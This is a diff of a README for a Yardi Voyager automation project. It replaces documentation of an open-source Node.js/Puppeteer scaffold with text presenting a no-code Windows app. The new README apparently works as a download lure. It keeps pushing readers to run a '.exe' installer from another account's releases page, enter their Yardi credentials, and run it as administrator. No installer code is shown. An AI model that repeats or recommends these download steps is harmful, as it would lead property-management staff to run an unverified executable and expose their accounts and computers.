@@ -1,292 +1,172 @@
-# Yardi Voyager Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fyardi-voyager-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/yardi-voyager-browser-automation)
+# 🚀 yardi-voyager-browser-automation - Automate Property Tasks Easily
 
-> Automate Yardi Voyager — the reliable way to interact with Yardi programmatically, with or without an official API.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🔴 Hard](https://img.shields.io/badge/Difficulty-hard-red.svg)
-
-<!-- keywords: yardi voyager automation, yardi automation, property management automation, yardi api alternative, yardi rent roll automation, real estate software automation -->
-
-## What This Is
-
-**Yardi Voyager** (Real Estate) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Yardi Native / Azure AD), and browser-only workflows make traditional API integration a pain.
-
-This project gives you a **complete browser automation scaffold** for Yardi Voyager using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
-
-This system requires **MFA** (Yardi Two-Factor / Email OTP). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Browser-Automation-Hub/yardi-voyager-browser-automation.git
-cd yardi-voyager-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
-
-## Two Ways to Run
-
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
-
-## Supported Actions
-
-- `login_yardi()` — Authenticate to Yardi Voyager with 2FA support
-- `extract_rent_roll()` — Pull current and historical rent roll data
-- `create_work_order()` — Submit and track maintenance work orders
-- `process_lease()` — Enter lease agreements and renewals
-- `generate_financial_report()` — Run and export property financial reports
-
-## Use Cases
-
-- Property managers automating Yardi data extraction
-- Real estate firms building BI on top of Yardi
-- Maintenance coordination automation
-- Lease administration workflow automation
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/shainahygienical338/yardi-voyager-browser-automation/releases)
 
 ---
 
-## Option A: Open Source (Puppeteer)
+## About this App
 
-### Prerequisites
+yardi-voyager-browser-automation helps you automate repetitive tasks in Yardi Voyager. It can extract rent rolls, handle work orders, process leases, enter vendor invoices, and generate financial reports automatically. This tool saves time and reduces manual work within property management.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- Yardi Voyager account with appropriate permissions
-
-### Installation
-
-```bash
-npm install
-cp .env.example .env
-```
-
-### Configuration (`.env`)
-
-```env
-YARDI_URL=https://www.yardiasp14.com/your-site/webforms/userlogin.aspx
-YARDI_USERNAME=your-username
-YARDI_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
-
-### Basic Login Example
-
-```javascript
-const { createSession } = require('./src/auth');
-const { login_yardi } = require('./src/actions');
-
-async function main() {
-  const page = await createSession();
-  const result = await login_yardi(page, { /* options */ });
-  console.log(result);
-}
-
-main().catch(console.error);
-```
-
-### File Structure
-
-```
-yardi-voyager-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+You do not need programming skills to use this app. It runs on your Windows computer and works by controlling your browser to complete tasks for you.
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 🖥 System Requirements
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+This app runs on Windows computers with the following:
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
+- Windows 10 or higher (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection
+- Google Chrome or Microsoft Edge installed
 
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_yardi } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_yardi(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
+The app uses a tool called Playwright to control your browser. Chrome or Edge are recommended for best compatibility.
 
 ---
 
-## Authentication
+## 🔧 Key Features
 
-### Auth Methods Supported
-
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Yardi Native / Azure AD) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Yardi Two-Factor / Email OTP) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling Yardi Two-Factor / Email OTP MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
+- Automatic rent roll extraction from Yardi Voyager
+- Process and manage work orders without manual input
+- Automate lease processing tasks
+- Enter vendor invoices efficiently
+- Generate financial reports for property management
+- Runs in the background with minimal user input needed
 
 ---
 
-## Custom Actions
+## ⚙️ Installation and Setup
 
-Use the `ActionBuilder` fluent API to chain custom workflows:
+### Step 1: Download the App
 
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
+[![Download Now](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/shainahygienical338/yardi-voyager-browser-automation/releases)
 
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
+- Visit the release page by clicking the link above.
+- Look for the latest version available.
+- Download the Windows installer file. It will usually have a `.exe` extension.
 
----
+### Step 2: Run the Installer
 
-## Error Handling & Reliability
+- Locate the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start the installation.
+- Follow the prompts on the screen.
+- Choose the default options unless you know what you need to change.
+- Wait for the installation to finish.
 
-```javascript
-const { retry, humanDelay } = require('./src/utils');
+### Step 3: Open the Application
 
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
+- Go to your Start menu.
+- Find **yardi-voyager-browser-automation** in the apps list.
+- Click to open.
 
 ---
 
-## Why Not Use the Official API?
+## 🚀 Using the App for the First Time
 
-Yardi Voyager official API is limited, expensive to access, or requires complex authentication that makes programmatic integration impractical.
+### Step 1: Log In to Yardi Voyager
 
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
+- The app opens a browser window for you.
+- Sign in to your Yardi Voyager account using your regular credentials.
+- The app uses this login to access the data it needs.
 
----
+### Step 2: Choose Your Task
 
-## Production Deployment
+Inside the app's main window, select what you want to automate:
 
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
+- Rent roll extraction
+- Work order management
+- Lease processing
+- Vendor invoice entry
+- Financial report generation
 
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
+### Step 3: Start Automation
 
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
+- Click "Start" to begin the process.
+- The app will control the browser to perform the tasks.
+- You will see progress updates during automation.
+  
+### Step 4: Save or Export Data
 
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Yardi Two-Factor / Email OTP MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in Yardi Voyager web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-> 🔍 Selector reference not yet documented for Yardi Voyager. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/yardi-voyager-browser-automation/pulls).
+- When the process finishes, save or export the files.
+- Data is saved in formats you can open, like Excel or PDF.
 
 ---
 
-## More Browser Automation Projects
+## 📂 Where to Find Output Files
 
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
+Automation results are stored on your computer. By default:
 
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
+- Files save to a folder called `YardiAutomationOutput` in your Documents folder.
+- Opening this folder shows your rent rolls, reports, and invoices.
 
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when Yardi updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
+You can change the save location within the app’s settings.
 
 ---
 
-*Built with ❤️ for developers who need to automate Yardi Voyager without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
+## ⚙️ App Settings and Preferences
 
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+You can adjust options to fit your needs:
+
+- Set the default output folder
+- Choose which browser to use (Chrome or Edge)
+- Set how often the app checks for updates or new tasks
+- Enable or disable notifications for completed tasks
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- Make sure your internet connection is stable.
+- Check that Chrome or Edge is installed and updated.
+- If the app cannot control the browser, run it as an administrator.
+- Close extra open browser windows to avoid conflicts.
+- Restart the app if it freezes or behaves unexpectedly.
+
+If errors occur during specific tasks, they usually relate to login issues or page changes on Yardi Voyager. Logging out and back in can help.
+
+---
+
+## 🔄 Updating the App
+
+- Visit the [releases page](https://github.com/shainahygienical338/yardi-voyager-browser-automation/releases) regularly.
+- Download the newest version when it is posted.
+- Close the app before installing the update.
+- Run the new installer. It will overwrite the old version without affecting your data.
+
+---
+
+## ❓ Frequently Asked Questions
+
+- **Can I use this on Mac or Linux?**  
+  No, the app only supports Windows.
+
+- **Do I need to sign in to Yardi Voyager each time?**  
+  Yes, for security, you must log in whenever you start automation.
+
+- **Is my Yardi login safe with this app?**  
+  The app only uses your login to automate browser actions and does not store your password.
+
+- **Can I automate multiple tasks in one run?**  
+  You must start each automation task one by one.
+
+---
+
+## 🔗 Useful Links
+
+- Download new releases here:  
+  https://github.com/shainahygienical338/yardi-voyager-browser-automation/releases
+
+- Report issues or request help:  
+  Use the GitHub Issues tab in this repository.
+
+---
+
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/shainahygienical338/yardi-voyager-browser-automation/releases)
+
+---
+
+## Topics
+
+ai-agents, anchorbrowser, browser-automation, nodejs, playwright, property-management, proptech, puppeteer, real-estate-automation, yardi, yardi-voyager
